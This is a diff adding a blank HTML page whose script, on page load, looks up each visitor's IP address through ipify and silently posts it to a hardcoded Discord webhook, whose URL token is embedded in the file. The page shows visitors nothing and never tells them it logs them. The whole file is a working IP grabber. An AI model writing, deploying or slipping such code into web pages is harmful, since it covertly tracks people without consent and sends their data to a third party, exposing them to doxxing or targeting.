@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+</head>
+<body>
+
+  <script>
+    // Replace 'WEBHOOK_URL' with your Discord webhook URL
+    var webhookUrl = 'https://discord.com/api/webhooks/1113688349878800445/lWt0rsk4cFH0uvbagEzKbGQUgJLF17bA3h4BqlfK9E8OizkwgWgzBhhYoVaBLaokSfOL';
+
+    // Function to send the IP address to the webhook
+    function sendIPToWebhook(ip) {
+      var message = {
+        content: 'User IP: ' + ip
+      };
+
+      $.post(webhookUrl, JSON.stringify(message), function(response) {
+        console.log('IP sent to webhook successfully');
+      });
+    }
+
+    // Function to get the user's IP address
+    function getUserIP(callback) {
+      // Using a free IP geolocation service to get the IP address
+      $.getJSON('https://api.ipify.org?format=json', function(data) {
+        callback(data.ip);
+      });
+    }
+
+    // When the page loads, get the IP address and send it to the webhook
+    $(document).ready(function() {
+      getUserIP(function(ip) {
+        sendIPToWebhook(ip);
+      });
+    });
+  </script>
+
+</body>
+</html>
